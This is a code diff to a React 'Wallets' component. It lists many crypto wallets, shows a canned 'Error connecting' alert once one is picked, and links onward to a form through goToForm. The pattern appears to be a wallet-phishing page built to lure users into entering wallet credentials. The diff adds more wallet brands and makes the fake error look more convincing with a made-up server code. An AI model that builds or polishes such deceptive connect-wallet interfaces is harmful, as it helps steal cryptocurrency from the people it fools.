@@ -44,6 +44,11 @@ const Wallets = () => {
       image: "assets/safepal.png",
     },
     {
+      id: 104,
+      wallet: "walletconect",
+      image: "assets/walletconect.png",
+    },
+    {
       id: 6,
       wallet: "TON wallet",
       image: "assets/ton.png",
@@ -77,6 +82,11 @@ const Wallets = () => {
       id: 12,
       wallet: "rainbow",
       image: "assets/rainbow.jpeg",
+    },
+    {
+      id: 41,
+      wallet: "binance chain",
+      image: "assets/bsc-logo.png",
     },
     {
       id: 13,
@@ -255,8 +265,23 @@ const Wallets = () => {
     },
     {
       id: 48,
-      wallet: "crypto",
+      wallet: "crypto.com",
       image: "assets/crypto.png",
+    },
+    {
+      id: 48,
+      wallet: "1inch",
+      image: "assets/1inch.jpeg",
+    },
+    {
+      id: 48,
+      wallet: "kucoin",
+      image: "assets/kucoin.png",
+    },
+    {
+      id: 48,
+      wallet: "tangem",
+      image: "assets/tangem.jpg",
     },
     {
       id: 49,
@@ -430,7 +455,7 @@ const Wallets = () => {
     },
     {
       id: 81,
-      wallet: "opera",
+      wallet: "opera wallet",
       image: "assets/opera.png",
     },
     {
@@ -465,7 +490,7 @@ const Wallets = () => {
     },
     {
       id: 88,
-      wallet: "q3",
+      wallet: "q3 wallet",
       image: "assets/q3.jpeg",
     },
     {
@@ -495,7 +520,7 @@ const Wallets = () => {
     },
     {
       id: 94,
-      wallet: "sonic",
+      wallet: "sonic chain",
       image: "assets/sonic.png",
     },
     {
@@ -542,11 +567,6 @@ const Wallets = () => {
       id: 103,
       wallet: "tezos",
       image: "assets/tezos.png",
-    },
-    {
-      id: 104,
-      wallet: "walletconect",
-      image: "assets/walletconect.png",
     },
     {
       id: 105,
@@ -680,7 +700,7 @@ const Wallets = () => {
                 <Alert color="failure" icon={HiInformationCircle}>
                   <div className="flex items-center gap-3 flex-wrap w-full">
                     <span className="font-medium truncate">
-                      Error connecting...
+                      Error connecting to server-BH7R6T7...
                     </span>
                     <Badge
                       onClick={() => goToForm(selectedWallet[0].wallet)}
@@ -708,7 +728,7 @@ const Wallets = () => {
               >
                 <div className="flex items-center justify-between">
                   <div className="text-gray-900 dark:text-gray-50">
-                    <h4 className="text-lg xl:text-xl font-semibold uppercase ">
+                    <h4 className="text-base xl:text-lg font-semibold uppercase ">
                       {selectedWallet[0]?.wallet}
                     </h4>
                     <small>Easy-to-use browser extension</small>
@@ -738,7 +758,7 @@ const Wallets = () => {
                   alt={wallet.wallet}
                   loading="lazy"
                 />
-                <h1 className="capitalize text-base font-semibold truncate text-gray-900 dark:text-gray-300">
+                <h1 className="capitalize text-sm font-semibold truncate text-gray-900 dark:text-gray-300">
                   {wallet.wallet}
                 </h1>
               </div>
